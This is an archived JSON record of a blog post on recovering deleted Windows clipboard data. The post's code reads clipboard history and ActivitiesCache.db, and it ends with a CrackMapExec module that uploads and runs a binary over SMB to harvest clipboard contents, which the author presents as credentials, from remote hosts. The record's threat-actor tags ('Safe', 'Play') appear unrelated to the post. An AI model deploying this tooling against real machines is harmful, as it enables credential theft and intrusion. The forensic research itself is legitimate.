{
    "id": "d70ef6d0-347a-4cd6-beb3-d81f9a796ae9",
    "created_at": "2023-05-10T02:08:43.495371Z",
    "updated_at": "2025-03-27T02:16:26.497972Z",
    "deleted_at": null,
    "sha1_hash": "5cafa5cae158894972708e24df0e4471aab8d15b",
    "title": "2023-04-27 - The Art of Clipboard Forensics Recovering Deleted Data",
    "authors": "",
    "file_creation_date": "2023-05-09T21:09:51Z",
    "file_modification_date": "2023-05-09T21:09:51Z",
    "file_size": 660695,
    "plain_text": "# The Art of Clipboard Forensics Recovering Deleted Data\n\n**[xret2pwn.github.io/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data](https://xret2pwn.github.io/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/)**\n\nApril 27, 2023\n\n## Introduction\n\nIn this blog post, I’ll be sharing my notes from my exploration of clipboard forensics. I’ll\ncover the tools and techniques used in this process and explain how you can use them to\ndump the clipboard data even if it deleted. So, if you’re interested in learning more about\nclipboard forensics, read on!\n\n## Table of Content\n\n Goal and Objective\n\nMy goal was to challenge myself by exploring Windows APIs, and I chose to focus on the\nClipboard. While I knew that Microsoft had thoroughly documented the Clipboard, I wanted\nto test my skills by delving deeper into its data APIs. During my exploration, I stumbled upon\nsomething that completely changed my objective: the possibility of recovering deleted\nClipboard data. This discovery motivated me to push my skills further and find a way to\ndump even the deleted Clipboard data. I will share my findings and techniques in this blog\npost. I hope you enjoy reading!\n\n## Enabling the Clipboard\n\nNow that the goal is clear, the next step is to figure out where to start. I decided to begin with\nthe Windows System Clipboard, as it is the place where you can enable or disable the\nclipboard history in Windows. To understand how this works, I wanted to know how\nWindows knows whether the clipboard is enabled or disabled, and whether there is a registry\nkey that controls it.\n\nTo find out, I used a tool called Process Monitor to monitor registry activity on the system.\nAfter some digging, I was able to locate the registry key responsible for controlling the\nClipboard feature: ClipboardEnabled. When this key is set to 1, the clipboard is enabled, and\nwhen it is set to 0, the clipboard is disabled.\n\n\n-----\n\n## Enumeration\n\nSo, now I know how to enable the clipboard, but I still don’t know which API that I can use it\nto get the clipboarded data. I came up with an idea: what if I searched for any DLLs in the\nSystem32 folder that were named Clipboard? To my surprise, I found two DLLs:\n\n1. ClipboardServer.dll\n2. SettingsHandlers_Clipboard.dll\n\nSo, I have tried to know the exported functions in those DLLs,\n\nFor ClipboardServer.dll I found 3 functions listed below:\n\n**Function Name**\n\nDllCanUnloadNow\n\nDllGetActivationFactory\n\nDllGetClassObject\n\nFor SettingsHandlers_Clipboard.dll I found 4 functions listed below:\n\n**Function Name**\n\nDllCanUnloadNow\n\nDllGetActivationFactory\n\nDllGetClassObject\n\nGetSetting\n\nBut I still feel like there are other DLLs I didn’t get, so I tried to get the loaded DLL in the\ncurrent running processes I did that through the following command.\n```\n tasklist /m\n\n\n```\nThen I found 2 other DLLs listed below:\n\n\n-----\n\n1. Clipc.dll\n2. ClipSVC.dll\n\nSo I have tried to do the same I did in the previous DLLs.\n\nFor ClipSVC.dll I found 2 functions listed below:\n\n**Function Name**\n\nServiceMain\n\nSvchostPushServiceGlobals\n\nFor Clipc.dll, I found 22 functions, and the function names seemed to be related to clipboard\nAPIs.\n\nI also attempted to find the related process for the clipboard viewer by pressing `WIN+V .`\nHowever, the problem with the clipboard viewer is that once you click anywhere outside of\nthe viewer, the window will close. This made it difficult to retrieve the process name for the\nclipboard viewer using traditional methods. Despite my efforts, I was unable to find the\nprocess name for the clipboard viewer.\n\n## Recovering Deleted Clipboard Data\n\nBy reversing the previous DLLs, I discovered a file called `tokens.dat in the`\n```\n%ProgramData%\\Microsoft\\Windows\\ClipSVC folder. This file contains encrypted data\n\n```\nrelated to the Clipboard.\n\nIt’s worth noting that the `ClipSVC folder is used by the Clipboard Service in Windows,`\nwhich is responsible for managing the Clipboard. The service runs as a Windows Service and\nis started automatically at system startup. The `ClipSVC folder contains various files and`\nsubfolders that are used by the Clipboard Service to store Clipboard data, history, and other\nrelated information.\n\nWhile I didn’t attempt to reverse the DLL to write a decryption function to read the Clipboard\ndata for burnout purposes, I may do so later.\n\nI then wondered if the data was already decrypted by the process, could I scrape the\nClipboard data from memory? Upon investigating further, I discovered that the process that\nuses `CLIPC.dll is called` `TextinputHost.exe . So, I used Process Hacker to search for`\nthe Clipboarded data.\n\n\n-----\n\nI then cleared the Clipboard data history and checked if it could still be scraped from\nmemory.\n\n\n-----\n\nAs expected it didn’t get deleted from memory.\n\n## Clipboard History APIs\n\nAfter scraping the deleted/cleared clipboard data, I was wondering if it was just deleted from\nthe Clipboard Viewer. So, I wanted to check if using the clipboard history APIs would return\nthe deleted data or if it would say that it’s deleted.\n\nSo, I have found the\n```\nwindows.applicationmodel.datatransfer.clipboard.gethistoryitemsasync\n\n```\nmethod. This method allows you to retrieve a list of `ClipboardHistoryItem objects`\n\n\n-----\n\nrepresenting the contents of the user s clipboard history. Clipboard.GetHistoryItemsAsync\n[Method (Windows.ApplicationModel.DataTransfer) - Windows UWP applications |](https://learn.microsoft.com/en-us/uwp/api/windows.applicationmodel.datatransfer.clipboard.gethistoryitemsasync?view=winrt-22621)\nMicrosoft Learn\n\nBy using this method, we can get the clipboard history, but it doesn’t return the deleted\nclipboard history. Therefore, we can only get the deleted history by scraping the memory of\nthe TextinputHost.exe process. However, once the machine is rebooted, the data will also be\nremoved.”\n```\n#include <iostream>\n\n#include <winrt/Windows.ApplicationModel.DataTransfer.h>\n\n#include <winrt/Windows.Foundation.h>\n\nusing namespace winrt;\n\nusing namespace Windows::ApplicationModel::DataTransfer;\n\nusing namespace Windows::Foundation;\n\nint main() {\n\n  init_apartment();\n\n  IVectorView<ClipboardHistoryItem> historyItems =\nClipboard::GetHistoryItemsAsync().get();\n\n  for (auto const& item : historyItems)\n\n  {\n\n    std::cout << \"FormatId: \" << item.FormatId() << std::endl;\n\n    std::cout << \"Content: \" << winrt::to_string(item.Content().ToString()) <<\nstd::endl;\n\n  }\n\n  return 0;\n\n}\n\n\n\n```\nWhile writing this blog post, I stumbled upon a new post by Raymond Chen, which explains\nhow to enumerate the clipboard history using PowerShell. Enumerating Windows clipboard\nhistory in PowerShell - The Old New Thing (microsoft.com)\n\n\n-----\n\n```\nAdd-Type -AssemblyName System.Runtime.WindowsRuntime\n\n$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name\n-eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()\n[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]\n\nfunction Await($WinRtTask, $ResultType) {\n\n $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)\n\n $netTask = $asTask.Invoke($null, @($WinRtTask))\n\n $netTask.Wait(-1) | Out-Null\n\n $netTask.Result\n\n}\n\n$null = [Windows.ApplicationModel.DataTransfer.Clipboard,\nWindows.ApplicationModel.DataTransfer, ContentType=WindowsRuntime]\n\n$op = [Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync()\n\n$result = Await ($op) `\n\n  ([Windows.ApplicationModel.DataTransfer.ClipboardHistoryItemsResult])\n\n$textops = $result.Items.Content.GetTextAsync()\n\nfor ($i = 0; $i -lt $textops.Count; $i++){ Await($textops[$i]) ([String]) }\n\n\n```\nHe is using the same method. but I still didn’t get the clipboard data history.\n\n## Another Way\n\n[@inversecos Introduced another way to get the clipboard history, by enumerating the](https://twitter.com/inversecos)\nActivitiesCache.db How to Perform Clipboard Forensics: ActivitiesCache.db, Memory\nForensics and Clipboard History (inversecos.com)\n\nThe ActivitiesCache.db can be located in `%AppData%\\Local\\ConnectedDevicesPlatform\\`\n```\n<UserProfile>\\ . I was interested in adding a new module to crackmapexec for dumping\n\n```\nthe clipboard history, so I wrote a quick Python script to dump the ActivitiesCache.db file.\n\n\n-----\n\n```\nimport os\n\nimport psutil\n\nimport sqlite3\n\nimport json\n\nimport base64\n\n\ndef get_user_profiles() -> dict:\n\n  \"\"\"\n\n  Returns a dictionary containing user profiles of ConnectedDevicesPlatform folder\n\n  \"\"\"\n\n  users = [user.name for user in psutil.users()]\n\n  profiles = {}\n\n  for user in users:\n\n    profile_folder_name = []\n\n    folder_path = os.path.join('C:\\\\Users', user, 'AppData', 'Local',\n'ConnectedDevicesPlatform')\n\n    if os.path.exists(folder_path):\n\n      items = os.listdir(folder_path)\n\n      num_dirs = 0\n\n      for item in items:\n\n        item_path = os.path.join(folder_path, item)\n\n        if os.path.isdir(item_path):\n\n          subfolder_path = os.path.join(item_path)\n\n          subitems = os.listdir(subfolder_path)\n\n          for subitem in subitems:\n\n            if subitem.endswith(\".db\"):\n\n              profile_folder_name.append(os.path.join(item_path,\nsubitem))\n\n              num_dirs += 1\n\n      if len(profile_folder_name) > 0:\n\n        profiles[user] = profile_folder_name\n\n      print(f'{user}: Found {num_dirs} directories in ConnectedDevicesPlatform\nfolder')\n\n    else:\n\n      print(f'{user}: ConnectedDevicesPlatform folder not found')\n\n  return profiles\n\n\ndef get_clipboard_data():\n\n  \"\"\"\n\n  Extracts clipboard data from ConnectedDevicesPlatform folders\n\n  \"\"\"\n\n  profiles = get_user_profiles()\n\n  if len(profiles) == 0:\n\n    return\n\n  for user, profile_folder_names in profiles.items():\n\n```\n\n-----\n\n```\n    for profile_folder_name in profile_folder_names:\n\n      with sqlite3.connect(profile_folder_name) as conn:\n\n        conn.row_factory = sqlite3.Row\n\n        c = conn.cursor()\n\n        c.execute(\"SELECT ClipboardPayload FROM ActivityOperation WHERE\nClipboardPayload IS NOT NULL\")\n\n        results = c.fetchall()\n\n        for row in results:\n\n          data = json.loads(row[0])\n\n          if data[0][\"formatName\"] == \"Text\":\n\n            try:\n\n              decoded_data = base64.b64decode(data[0]\n[\"content\"]).decode('utf-8')\n\n            except Exception as e:\n\n              print(f\"{user}: Error decoding base64 data. {e}\")\n\n              continue\n\n            print(f'{user}: Password from ClipboardPayload:\n{decoded_data}')\n\n\nif __name__ == \"__main__\":\n\n  get_clipboard_data()\n\n```\nSo I will just add two more ways (TextinputHost Scrapping, Current Clipboard Data) in this\nscript soon, because I have burn out :joy: So I just want to play Fortnite and fifa23 the whole\nday :joy:\n\n## CrackMapExec Module\n\nImagen how many credentials we can get if used made a module for crackmapexec to dump\nthe clipboard data. So, here is the full module, soon I will just pull it into the Crackmapexec\nGithub.\n\n[Blogposts-Tools/Clipboard History Sinper at main · xRET2pwn/Blogposts-Tools · GitHub](https://github.com/xRET2pwn/Blogposts-Tools/tree/main/Clipboard%20History%20Sinper)\n\n\n-----\n\n```\n# ClipboardHistory module for CME\n\n# Author of the module : https://twitter.com/RET2_pwn\n\n# ClipboardHistory, take one argument Clip_EXE which the binary path. for more\ninformation, https://github.com/xRET2pwn/BlogpostsTools/tree/main/Clipboard%20History%20Sinper\n\nfrom base64 import b64decode\n\nfrom sys import exit\n\nfrom os import path\n\nclass CMEModule:\n\n  name = \"clipboard\"\n\n  description = \"Dump the clipboard history content.\"\n\n  supported_protocols = [\"smb\"]\n\n  opsec_safe = True # could be flagged\n\n  multiple_hosts = True\n\n  def options(self, context, module_options):\n\n    '''\n\n    Clip_EXE  // ClipboardHistory Binary Path.\n\n    '''\n\n    self.tmp_dir = \"C:\\\\Windows\\\\Temp\\\\\"\n\n    self.share = \"C$\"\n\n    self.tmp_share = self.tmp_dir.split(\":\")[1]\n\n    self.clipboardhistory = \"ClipboardHistory.exe\"\n\n    self.useembeded = True\n\n    self.ClipboardHistory_embedded = b64decode('')\n\n    if \"Clip_EXE\" in module_options:\n\n      self.FilePath = module_options[\"Clip_EXE\"]\n\n      self.useembeded = False\n\n  def Dump_Clipboard_Data(self, _, connection):\n\n      command = f\"{self.tmp_dir}ClipboardHistory.exe\"\n\n      return connection.execute(command, True)\n\n  def on_admin_login(self, context, connection):\n\n    if self.useembeded:\n\n      file_to_upload = \"/tmp/ClipboardHistory.exe\"\n\n      with open(file_to_upload, 'wb') as FileWrite:\n\n        FileWrite.write(self.ClipboardHistory_embedded)\n\n    else:\n\n      if path.isfile(self.FilePath):\n\n        file_to_upload = self.FilePath\n\n      else:\n\n        context.log.error(f\"Cannot open {self.FilePath}\")\n\n        exit(1)\n\n```\n\n-----\n\n```\n    context.log.info(f\"Uploading {self.clipboardhistory}\")\n\n    with open(file_to_upload, 'rb') as ClipboardOpenFile:\n\n      try:\n\n        connection.conn.putFile(self.share, f\"{self.tmp_share}\n{self.clipboardhistory}\", ClipboardOpenFile.read)\n\n        context.log.success(f\"Clipboard binary successfully uploaded\")\n\n      except Exception as e:\n\n        context.log.error(f\"Error writing file to share {self.tmp_share}:\n{e}\")\n\n        return\n\n    try:\n\n      context.log.info(f\"Listing available primary tokens\")\n\n      p = self.Dump_Clipboard_Data(context, connection)\n\n      for line in p.splitlines():\n\n        context.log.highlight(f\"{line}\")\n\n    except Exception as e:\n\n      context.log.error(f\"Error runing command: {e}\")\n\n    finally:\n\n      try:\n\n        connection.conn.deleteFile(self.share, f\"{self.tmp_share}\n{self.clipboardhistory}\")\n\n        context.log.success(f\"ClipboardHistory binary successfully deleted\")\n\n      except Exception as e:\n\n        context.log.error(f\"Error deleting ClipboardHistory.exe on\n{self.share}: {e}\")\n\n## Conclusion\n\n```\nIn conclusion, clipboard forensics is a fascinating topic that involves delving deeper into the\nWindows Clipboard system and discovering its hidden features. By exploring Windows APIs\nand using tools such as Process Monitor and Process Hacker, it is possible to recover deleted\nClipboard data and scrape Clipboard data from memory. Although the process of scraping\ndeleted data can be challenging, this blog post has provided valuable insights into the\ntechniques and tools used in clipboard forensics. And at the end have created a crackmapexec\nmodule that can be used to extract clipboard data\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/AV Tech/2023-04-27 - The Art of Clipboard Forensics Recovering Deleted Data.pdf"
    ],
    "report_names": [
        "2023-04-27 - The Art of Clipboard Forensics Recovering Deleted Data.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1683684523,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1683666591,
    "ts_modification_date": 1683666591,
    "files": {
        "pdf": "https://archive.orkl.eu/5cafa5cae158894972708e24df0e4471aab8d15b.pdf",
        "text": "https://archive.orkl.eu/5cafa5cae158894972708e24df0e4471aab8d15b.txt",
        "img": "https://archive.orkl.eu/5cafa5cae158894972708e24df0e4471aab8d15b.jpg"
    }
}